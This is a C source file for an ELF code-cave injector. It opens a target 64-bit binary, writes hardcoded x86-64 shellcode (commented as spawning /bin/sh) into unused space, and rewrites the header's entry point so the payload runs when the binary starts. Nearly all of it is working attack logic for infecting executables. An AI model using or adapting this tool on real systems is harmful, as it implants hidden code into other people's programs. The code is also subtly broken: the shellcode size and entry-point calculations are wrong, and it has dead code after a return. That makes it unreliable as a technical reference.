/*
 * =====================================================================================
 *
 *       Filename:  code_cave_inject.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  11/27/2020 09:58:05 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  SPOOKY (@spooky_sec), https://discord.gg/UTVBvJs
 *
 * =====================================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <elf.h>
#include <malloc.h>

#include "./findcave.h"

#define DEBUG

typedef struct {
    char *code;
    size_t size;
} shell_code_t;

int change_entry(char *bin_path, code_cave_t *cc) {

    int fd = open(bin_path, O_RDWR);
    Elf64_Ehdr ehdr;
    read(fd, &ehdr, sizeof ehdr);

    ehdr.e_entry = cc->start;
    lseek(fd, 0, SEEK_SET);
    write(fd, &ehdr, sizeof ehdr);
    close(fd);

    return 0;

    close(fd);
}

int inject(char *bin_path, shell_code_t *sc, code_cave_t *cc, Elf64_Ehdr *ehdr) {
    
    int fd = open(bin_path, O_RDWR);
    if (sc->size < cc->size) {
        off_t off;

        off = lseek(fd, cc->start, SEEK_SET);
        if (off < 0) {
            printf("lseek() failed!\n");
            return -1;
        }

        cc->bytes_written = write(fd, sc->code, sc->size);

        if (cc->bytes_written != sc->size) {
            printf("[!] Looks like we found the error :)\n");
        }
        
    } else {
        printf("Shell code too big 👀\n");
    }

    return 0;
}

void debug(const char *file, shell_code_t *sc, code_cave_t *cc, Elf64_Ehdr *ehdr) {
    printf("ShellCode Sz : %ld\n", sc->size);
    printf("Entry Point  : 0x%lX\n", ehdr->e_entry);
    printf("File Size    : %ld\n", cc->file_size);
    printf("Code Cave Sz : %d\n", cc->size);
    printf("Start Address: 0x%X\n", cc->start);
    printf("End Address  : 0x%X\n", cc->end);
    printf("Written Bytes: %d\n", cc->bytes_written);

    return;
}

int main(int argc, char **argv) {

    if (argc != 2) {
        printf("Usage: <binary file>\n");
        return -1;
    }

    shell_code_t sc;
    code_cave_t cc;
    Elf64_Ehdr ehdr;

    // Spawns a shell :P
    sc.code =
    "\x48\x31\xc0\x48\x89\xc2\x48\x89"
    "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
    "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x00\xcc\x90\x90\x90";
    sc.size = (strlen(sc.code) * sizeof(sc.code));

    char *bin_path = argv[1];
    int fd = open(bin_path, O_RDWR);

    read(fd, &ehdr, sizeof ehdr);

    if (find_code_cave(argv[1], &cc)) {
        printf("Error\n");
        exit(1);
    }

#ifdef DEBUG
    debug(argv[1], &sc, &cc, &ehdr);
#endif

    inject(argv[1], &sc, &cc, &ehdr);
    change_entry(argv[1], &cc);

}
